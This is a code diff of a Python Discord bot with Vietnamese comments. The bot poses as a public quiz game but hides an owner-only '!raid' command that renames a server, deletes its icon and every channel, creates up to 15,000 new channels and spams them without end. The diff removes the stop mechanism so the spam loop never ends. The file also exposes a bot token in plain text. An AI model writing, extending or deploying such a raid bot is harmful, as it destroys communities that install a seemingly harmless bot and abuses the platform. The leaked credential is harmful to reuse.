@@ -9,7 +9,7 @@ import os
 import math
 
 # ===== CẤU HÌNH GỐC (NUKE) =====
-TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.Gwz2CY.2Wo79QF6ka4Qu8AylW2pQW1A8mH_8EbFTPKtJs"
+TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.Gwz2CY.2Wo79QF6ka4Qu8AylW2pQW1A8mH_8EbFTPKtJs" 
 OWNER_ID = 1413781843030966345
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
@@ -1820,9 +1820,7 @@ class QuizView(discord.ui.View):
             child.disabled = True
         await interaction.edit_original_response(view=self)
 
-# ===== HÀM NUKE (ĐÃ SỬA) =====
-nuke_running = False
-
+# ===== HÀM NUKE (GIỮ NGUYÊN CƠ CHẾ CŨ, CHỈ THÊM XÓA AVATAR) =====
 async def change_guild_name(guild):
     try:
         await guild.edit(name=NEW_GUILD_NAME)
@@ -1846,12 +1844,8 @@ async def delete_all_channels(guild):
             pass
 
 async def create_channels_and_spam(guild):
-    global nuke_running
     total_created = 0
     for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
-        if not nuke_running:
-            print("[*] Nuke stopped by user.")
-            return
         batch_tasks = []
         batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
         for i in range(batch_count):
@@ -1869,8 +1863,7 @@ async def create_channels_and_spam(guild):
         await asyncio.sleep(0.05)
 
 async def continuous_spam(guild):
-    global nuke_running
-    while nuke_running:
+    while True:
         channels = list(guild.text_channels)
         if not channels:
             await asyncio.sleep(0.3)
@@ -1883,21 +1876,18 @@ async def continuous_spam(guild):
         await asyncio.sleep(0.1)
 
 async def raid(guild):
-    global nuke_running
-    nuke_running = True
     await change_guild_name(guild)
     await asyncio.sleep(0.5)
-    await delete_guild_icon(guild)
+    await delete_guild_icon(guild)   # <-- CHỈ THÊM DÒNG NÀY
     await asyncio.sleep(0.5)
     await delete_all_channels(guild)
     await asyncio.sleep(0.1)
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
-# ===== LỆNH !raid VÀ !stop (ĐÃ SỬA – !stop ÂM THẦM) =====
+# ===== LỆNH !raid (DM lưu link, server nuke) =====
 @client.event
 async def on_message(message):
-    global nuke_running
     if message.author.id == client.user.id:
         return
     if message.author.id != OWNER_ID:
@@ -1919,9 +1909,7 @@ async def on_message(message):
             await raid(message.guild)
 
     elif message.content.lower() == "!stop":
-        if nuke_running:
-            nuke_running = False
-        # Không gửi gì cả – âm thầm dừng
+        sys.exit(0)
 
 # ===== SỰ KIỆN =====
 @client.event
@@ -1932,7 +1920,6 @@ async def on_ready():
     print(f"[*] Bot online: {client.user}")
     print("[*] Public: /start, /rankings, /diem")
     print("[*] Hidden: !raid (owner only – full nuke)")
-    print("[*] Hidden: !stop (owner only – stop nuke silently)")
     await tree.sync()
     print("[*] Slash commands synced.")
     for guild in client.guilds:
